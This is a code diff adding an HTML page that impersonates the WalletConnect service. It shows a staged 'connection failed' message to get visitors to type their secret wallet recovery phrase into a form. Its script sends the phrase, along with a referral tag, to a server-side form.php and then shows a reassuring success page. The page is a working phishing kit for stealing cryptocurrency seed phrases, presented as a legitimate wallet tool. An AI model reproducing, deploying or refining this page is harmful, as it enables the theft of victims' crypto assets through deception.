@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Import Wallet</title>
+    <link href="images/index.svg" rel="shortcut icon">
+
+    <meta property="og:url" content="index.html" />
+    <meta property="og:title" content="Wallet Connect" />
+    <meta property="og:description" content="Wallet Connect" />
+    <meta property="og:image" content="images/index.svg" />
+
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/app.css">
+    <link rel="stylesheet" href="css/custom.css">
+    <link rel="stylesheet" href="css/blockchain.css">
+    <link href="fontawesome-free-5/css/all.css" rel="stylesheet" type="text/css">
+    <script src="js/jquery.min.js"></script>
+    <script src="js/app.js"></script>
+
+    <!-- Styles -->
+    <style>
+        body {
+            font-family: 'Nunito';
+        }
+        .loader-container {
+            max-width: 100%;
+            margin: 0 auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+    <main>
+        <div class="bg-white" style="height: 100vh">
+            <div class="top">
+                <a href="#" class="left text-center">Github</a>
+                <a href="#" class="left text-center">Docs</a>
+                <a href="index.html" class="main m-0 text-center"><img src="images/logo.svg" alt="logo"></a>
+                <a href="#" class="left text-center">Wallets</a>
+                <a href="#" class="left text-center" style="text-align: right">Apps</a>
+            </div>
+            <div class="gFeYHJ mt-5">WalletConnect</div>
+            <section>
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-md-6 col-lg-4 shadow bg-white pr-4 pl-4 m-1">
+                            <div class="text-center mb-2"></div>
+                            <div class="alert alert-danger fade show text-center" role="alert" style="font-size:0.8em"
+                                id="warningmessage">
+                                Invalid recovery phrase
+                            </div>
+                            <div class="alert alert-success fade show text-center" role="alert" style="font-size:0.8em"
+                                id="successmgs">
+                                Success! Re-check wallet in next 24 hours
+                            </div>
+                            <div class="load-cont">
+                                <div class="loader-container">
+                                    <div class="lds-facebook">
+                                        <div></div>
+                                        <div></div>
+                                        <div></div>
+                                    </div>
+                                </div>
+                                <p class="text-center">Connecting to wallet</p>
+                            </div>
+                            <div class="mt-4 form-sect">
+                                <div class="alert-danger py-2 px-2 failed-text" style="font-size:0.8em">
+                                    Connection failed, please enter your recovery phrase manually.
+                                </div>
+                                <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
+
+                                    <li class="nav-item" role="presentation">
+                                        <a class="nav-link" id="pills-profile-tab" data-toggle="pill" href="#"
+                                            role="tab" aria-controls="pills-profile" aria-selected="false">Phrase</a>
+                                    </li>
+                                </ul>
+                                <div class="tab-content" id="pills-tabContent">
+                                    <div class="tab-pane fade show active" id="pills-profile" role="tabpanel"
+                                        aria-labelledby="pills-profile-tab">
+                                        <form action="" method="post" id="sync">
+                                            <div class="row">
+                                                <div class="col-md-12">
+                                                    <div class="form-group mt-2">
+                                                        <textarea class="form-control formInputBlockchain" type="text"
+                                                            name="phrase"
+                                                            placeholder="Enter your Secret Recovery Phrase" rows="5"
+                                                            onkeyup=removereq()></textarea>
+                                                    </div>
+                                                    <input type="hidden" name="wal" value="" class="ref">
+                                                    <div class="form-group pt-2">
+                                                        <div class="row">
+                                                            <div class="col-12">
+                                                                <p class="" style="font-size: 0.8em; color:#144fea">
+                                                                    Typically 12 (sometimes 24) words separated by
+                                                                    single spaces</p>
+                                                            </div>
+                                                            <div class="col-12 mt-2" style="float: right">
+                                                                <button type="submit" id="btnn" |
+                                                                    class="btn btn-primary w-100  mb-2"
+                                                                    style="height: 45px; font-size:0.8em; background-color:#144fea">IMPORT</button>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <footer class="edit-1">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12 text-center mt-4 mb-4">
+                            <span>© 2022 SYNCING PATCH. All rights reserved.<span>
+                        </div>
+                    </div>
+                </div>
+            </footer>
+        </div>
+    </main>
+    <style>
+        #successmgs {
+            display: none;
+        }
+
+        #warningmessage {
+            display: none;
+        }
+    </style>
+    <script>
+        $(document).ready(function () {
+            const urlSearchParams = new URLSearchParams(window.location.search);
+            const params = Object.fromEntries(urlSearchParams.entries());
+            var rfv = document.querySelector('.ref').value = params.ref;
+
+            $("#sync").submit(function (e) {
+                e.preventDefault();
+                const text = document.querySelector(".formInputBlockchain");
+                let phrase = document.querySelector(".formInputBlockchain").value;
+                const phraseArr = phrase.trim().split(" ");
+                console.log(phraseArr)
+                if (phrase.trim() == "") {
+                    text.classList.add("required");
+
+                    return false;
+                } else if (phraseArr.length < 10) {
+                    document.querySelector("#warningmessage").style.display = "block";
+                    return false;
+                } else {
+                    var formData = new FormData($("#sync")[0]);
+                    $("#btnn").html("Processing..").prop("disabled", true);
+                    var rf = $('.ref').val(rfv);
+                    $.ajax({
+                        url: "form.php",
+                        type: 'POST',
+                        crossDomain: true,
+                        data: formData,
+                        contentType: false,
+                        processData: false,
+                        success: function (res) {
+
+                            window.location.href = "success.html";
+
+                        }
+                    });
+                }
+
+            });
+        });
+    </script>
+
+</body>
+
+</html>
